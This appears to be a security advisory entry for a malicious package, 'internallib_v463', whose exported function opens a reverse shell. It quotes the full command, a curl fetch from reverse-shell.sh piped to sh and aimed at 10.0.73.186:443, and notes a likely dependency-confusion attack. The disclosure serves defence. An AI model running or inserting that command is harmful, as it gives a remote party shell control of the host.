summary: internallib_v463 exports function that opens reverse shell to hardcoded IP
details: index.js exports a function `command` that runs `/bin/bash -c "curl https://reverse-shell.sh/10.0.73.186:443|sh"`, fetching a reverse-shell script from reverse-shell.sh and piping it to sh. When the exported function is invoked by a consumer of this package, an interactive shell is established outbound to the hardcoded attacker endpoint 10.0.73.186:443, granting a remote party full shell control of the installer host. The module contains a `console.log("Primeiro PWN")` string, consistent with hostile intent rather than a legitimate utility. The package name (`internallib_v463`) and the private-range destination IP are consistent with a dependency-confusion payload targeting an internal package name.

cwes.description: The product contains code that appears to be malicious in nature.
cwes.name: Embedded Malicious Code
